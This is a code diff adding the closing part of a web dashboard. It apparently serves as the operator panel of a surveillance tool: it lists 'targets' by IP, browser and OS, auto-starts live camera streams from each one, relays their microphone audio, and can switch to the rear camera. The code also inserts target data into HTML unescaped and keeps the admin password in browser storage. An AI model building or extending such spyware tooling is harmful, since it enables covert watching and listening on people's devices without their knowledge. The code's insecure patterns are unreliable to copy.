+}
+
+// Close modal on backdrop click
+document.getElementById('alert-modal').addEventListener('click', function(e) {
+  if (e.target === this) closeAlertModal();
+});
+
+// ─── Live Camera ───────────────────────────────────────────────
+
+const activeCameraStreams = {}; // targetId -> { facing, frameCount, fpsInterval, fpsCounter }
+
+function refreshCameraGrid() {
+  const grid = document.getElementById('camera-grid');
+  const empty = document.getElementById('camera-grid-empty');
+  const targetList = Object.values(targets);
+
+  if (targetList.length === 0) {
+    // Clear all cards except the empty state
+    const cards = grid.querySelectorAll('.camera-card');
+    cards.forEach(c => {
+      const cid = parseInt(c.dataset.clientId, 10);
+      if (activeCameraStreams[cid]) stopCameraStream(cid);
+      c.remove();
+    });
+    if (empty) empty.style.display = 'flex';
+    return;
+  }
+
+  if (empty) empty.style.display = 'none';
+
+  // Find existing cards in DOM to patch/keep
+  const existingCards = {};
+  grid.querySelectorAll('.camera-card').forEach(card => {
+    existingCards[card.dataset.clientId] = card;
+  });
+
+  // Render cards
+  targetList.forEach(t => {
+    const cid = String(t.clientId);
+    if (existingCards[cid]) {
+      // Remove from deletion list, update title info
+      delete existingCards[cid];
+      const titleEl = document.getElementById(`cam-title-text-${cid}`);
+      if (titleEl) {
+        titleEl.textContent = `#${t.clientId} — ${t.ip} (${t.browser} on ${t.os})`;
+      }
+    } else {
+      // Create new card
+      const cardHtml = `
+        <div class="camera-card panel" id="camera-card-${cid}" data-client-id="${cid}">
+          <div class="panel-header">
+            <div class="panel-title">
+              <span class="dot red blink" id="cam-live-dot-${cid}" style="display:none"></span>
+              <span class="camera-title-text" id="cam-title-text-${cid}">#${t.clientId} — ${t.ip} (${t.browser} on ${t.os})</span>
+            </div>
+            <div class="panel-actions">
+              <button class="btn-action" id="audio-toggle-btn-${cid}" onclick="toggleAudioMute(${cid})" title="Mute/Unmute Audio">🔇</button>
+              <button class="btn-action" onclick="toggleCameraFullscreen(${t.clientId})">⛶</button>
+            </div>
+          </div>
+          
+          <div class="camera-feed-container" id="camera-feed-container-${cid}">
+            <div class="camera-placeholder" id="camera-placeholder-${cid}">
+              <div class="camera-placeholder-icon">📹</div>
+              <p>No live stream</p>
+              <p class="camera-placeholder-sub">Click <strong>Start Stream</strong> below</p>
+            </div>
+            <img id="camera-live-img-${cid}" class="camera-live-img" src="" alt="Live camera feed" style="display:none">
+            <div class="camera-overlay-info" id="camera-overlay-info-${cid}" style="display:none">
+              <span class="cam-overlay-rec">● LIVE</span>
+              <span id="cam-overlay-fps-${cid}">0 fps</span>
+            </div>
+          </div>
+
+          <div class="camera-controls-row">
+            <button id="camera-start-btn-${cid}" class="camera-btn green" onclick="startCameraStream(${t.clientId})">Start Stream</button>
+            <button id="camera-stop-btn-${cid}" class="camera-btn red" onclick="stopCameraStream(${t.clientId})" disabled>Stop Stream</button>
+          </div>
+
+          <div class="camera-stats-box">
+            <div class="camera-stat-row">
+              <span class="camera-stat-label">Facing Mode</span>
+              <div class="camera-facing-btns">
+                <button class="camera-facing active" id="facing-front-${cid}" onclick="setCameraFacing(${t.clientId}, 'user')">🙂 Front</button>
+                <button class="camera-facing" id="facing-rear-${cid}" onclick="setCameraFacing(${t.clientId}, 'environment')">📷 Rear</button>
+              </div>
+            </div>
+            <div class="camera-stat-row">
+              <span class="camera-stat-label">Stream Stats</span>
+              <span class="camera-stat-val">
+                Frames: <span id="cam-frames-${cid}">0</span> | FPS: <span id="cam-fps-${cid}">0</span>
+              </span>
+            </div>
+          </div>
+        </div>
+      `;
+      grid.insertAdjacentHTML('beforeend', cardHtml);
+      // Auto-start stream by default
+      startCameraStream(t.clientId);
+    }
+  });
+
+  // Remove disconnected target cards
+  Object.keys(existingCards).forEach(cid => {
+    const targetId = parseInt(cid, 10);
+    if (activeCameraStreams[targetId]) {
+      stopCameraStream(targetId);
+    }
+    existingCards[cid].remove();
+  });
+}
+
+function startCameraStream(targetId) {
+  if (activeCameraStreams[targetId]) return; // already streaming
+
+  activeCameraStreams[targetId] = {
+    facing: 'user',
+    frameCount: 0,
+    fpsCounter: 0,
+    fpsInterval: null,
+    audioQueue: [],
+    isPlayingAudio: false,
+    isMuted: true
+  };
+
+  sendWS({ type: 'start_live_camera', targetId, facing: 'user' });
+
+  // Update UI components for this target card
+  document.getElementById(`camera-start-btn-${targetId}`).disabled = true;
+  document.getElementById(`camera-stop-btn-${targetId}`).disabled  = false;
+  document.getElementById(`camera-placeholder-${targetId}`).style.display = 'none';
+  document.getElementById(`camera-live-img-${targetId}`).style.display    = 'block';
+  document.getElementById(`camera-overlay-info-${targetId}`).style.display = 'flex';
+  document.getElementById(`cam-live-dot-${targetId}`).style.display = '';
+
+  // Calculate live tab badge count
+  updateCameraTabBadge();
+
+  // Stats ticking interval
+  activeCameraStreams[targetId].fpsInterval = setInterval(() => {
+    const stream = activeCameraStreams[targetId];
+    if (stream) {
+      document.getElementById(`cam-fps-${targetId}`).textContent = stream.fpsCounter;
+      document.getElementById(`cam-overlay-fps-${targetId}`).textContent = stream.fpsCounter + ' fps';
+      stream.fpsCounter = 0;
+    }
+  }, 1000);
+
+  addCtrlStatus(`[camera] 📹 Live stream started for target #${targetId}.`);
+}
+
+function stopCameraStream(targetId) {
+  const stream = activeCameraStreams[targetId];
+  if (!stream) return;
+
+  sendWS({ type: 'stop_live_camera', targetId });
+  addCtrlStatus(`[camera] ⏹️ Stream stopped for target #${targetId}.`);
+
+  if (stream.fpsInterval) clearInterval(stream.fpsInterval);
+  delete activeCameraStreams[targetId];
+
+  // Reset UI components for this target card
+  document.getElementById(`camera-start-btn-${targetId}`).disabled = false;
+  document.getElementById(`camera-stop-btn-${targetId}`).disabled  = true;
+  document.getElementById(`camera-placeholder-${targetId}`).style.display = '';
+  document.getElementById(`camera-live-img-${targetId}`).style.display    = 'none';
+  document.getElementById(`camera-live-img-${targetId}`).src              = '';
+  document.getElementById(`camera-overlay-info-${targetId}`).style.display = 'none';
+  document.getElementById(`cam-live-dot-${targetId}`).style.display       = 'none';
+  document.getElementById(`cam-frames-${targetId}`).textContent           = '0';
+  document.getElementById(`cam-fps-${targetId}`).textContent              = '0';
+
+  updateCameraTabBadge();
+}
+
+function receiveCameraFrame(msg) {
+  const stream = activeCameraStreams[msg.clientId];
+  if (!stream) return; // not listening for this target's frames
+
+  const img = document.getElementById(`camera-live-img-${msg.clientId}`);
+  if (img) img.src = msg.frame;
+
+  stream.frameCount++;
+  stream.fpsCounter++;
+  
+  const frameCountEl = document.getElementById(`cam-frames-${msg.clientId}`);
+  if (frameCountEl) frameCountEl.textContent = stream.frameCount;
+}
+
+function receiveAudioChunk(msg) {
+  const stream = activeCameraStreams[msg.clientId];
+  if (!stream) return; // not listening or active
+
+  stream.audioQueue.push(msg.audio);
+  if (!stream.isPlayingAudio) {
+    playNextAudioChunk(msg.clientId);
+  }
+}
+
+function playNextAudioChunk(targetId) {
+  const stream = activeCameraStreams[targetId];
+  if (!stream) return;
+
+  if (stream.audioQueue.length === 0) {
+    stream.isPlayingAudio = false;
+    return;
+  }
+
+  stream.isPlayingAudio = true;
+  const chunk = stream.audioQueue.shift();
+  const audio = new Audio(chunk);
+
+  // Apply muted state immediately
+  audio.muted = stream.isMuted;
+
+  audio.onended = () => {
+    playNextAudioChunk(targetId);
+  };
+  audio.onerror = () => {
+    playNextAudioChunk(targetId);
+  };
+
+  audio.play().catch(() => {
+    // Autoplay policy or decoding failure, proceed to next chunk
+    playNextAudioChunk(targetId);
+  });
+}
+
+function toggleAudioMute(targetId) {
+  const stream = activeCameraStreams[targetId];
+  const btn = document.getElementById(`audio-toggle-btn-${targetId}`);
+  if (!btn) return;
+
+  if (stream) {
+    stream.isMuted = !stream.isMuted;
+    btn.textContent = stream.isMuted ? '🔇' : '🔊';
+    addCtrlStatus(`[audio] Target #${targetId} live audio ${stream.isMuted ? 'muted' : 'unmuted'}.`);
+  } else {
+    // Handle the visual toggle fallback if not streaming yet
+    const currentlyMuted = btn.textContent === '🔇';
+    btn.textContent = currentlyMuted ? '🔊' : '🔇';
+  }
+}
+
+function setCameraFacing(targetId, facing) {
+  const stream = activeCameraStreams[targetId];
+  // Toggle UI buttons
+  const frontBtn = document.getElementById(`facing-front-${targetId}`);
+  const rearBtn = document.getElementById(`facing-rear-${targetId}`);
+  if (frontBtn) frontBtn.classList.toggle('active', facing === 'user');
+  if (rearBtn) rearBtn.classList.toggle('active', facing === 'environment');
+
+  if (!stream) return; // Not streaming currently, just set toggle state for when it starts
+
+  stream.facing = facing;
+  // Send restart request with new facing mode
+  sendWS({ type: 'stop_live_camera', targetId });
+  setTimeout(() => {
+    if (activeCameraStreams[targetId]) {
+      sendWS({ type: 'start_live_camera', targetId, facing });
+    }
+  }, 300);
+}
+
+function toggleCameraFullscreen(targetId) {
+  const container = document.getElementById(`camera-feed-container-${targetId}`);
+  if (!container) return;
+  if (!document.fullscreenElement) {
+    container.requestFullscreen().catch(() => {});
+  } else {
+    document.exitFullscreen();
+  }
+}
+
+function updateCameraTabBadge() {
+  const count = Object.keys(activeCameraStreams).length;
+  const badge = document.getElementById('badge-camera');
+  if (badge) {
+    if (count > 0) {
+      badge.textContent = count;
+      badge.style.display = '';
+    } else {
+      badge.style.display = 'none';
+    }
+  }
+}
+
+// ─── Ctrl Status Log ──────────────────────────────────────────────
+function addCtrlStatus(msg, isError = false) {
+  const panel = document.getElementById('ctrl-status');
+  const line  = document.createElement('div');
+  line.className = 'ctrl-status-line' + (isError ? ' error' : '');
+  line.textContent = `${new Date().toLocaleTimeString('en-US', { hour12: false })} ${msg}`;
+  panel.appendChild(line);
+  panel.scrollTop = panel.scrollHeight;
+}
+
+// ─── Card Flash Animation ─────────────────────────────────────────
+function flashCard(id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.style.opacity = '0.5';
+  el.style.transform = 'scale(0.97)';
+  setTimeout(() => {
+    el.style.opacity = '';
+    el.style.transform = '';
+  }, 250);
+}
+
+// ─── Helpers ──────────────────────────────────────────────────────
+function updateEl(id, val) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = val;
+}
+
+function updateStat(id, val) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = val;
+}
+
+function updateBadge(name, count) {
+  const el = document.getElementById('badge-' + name);
+  if (el) el.textContent = count;
+}
+
+function fmtTime(iso) {
+  if (!iso) return '—';
+  return new Date(iso).toLocaleTimeString('en-US', { hour12: false });
+}
+
+function fmtDateTime(iso) {
+  if (!iso) return '—';
+  const d = new Date(iso);
+  return d.toLocaleDateString('en-GB', { day: '2-digit', month: 'short' })
+    + ' ' + d.toLocaleTimeString('en-US', { hour12: false });
+}
+
+function escapeHtml(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+// Keyboard shortcuts
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') {
+    closeLightbox();
+    closeAlertModal();
+  }
+});
+
+// Auto-login on reload if previously authenticated
+window.addEventListener('DOMContentLoaded', () => {
+  const savedPass = localStorage.getItem('adminPassword');
+  if (savedPass === ADMIN_PASSWORD) {
+    attemptLogin(savedPass);
+  }
+});
+</script>
+
+</body>
+</html>
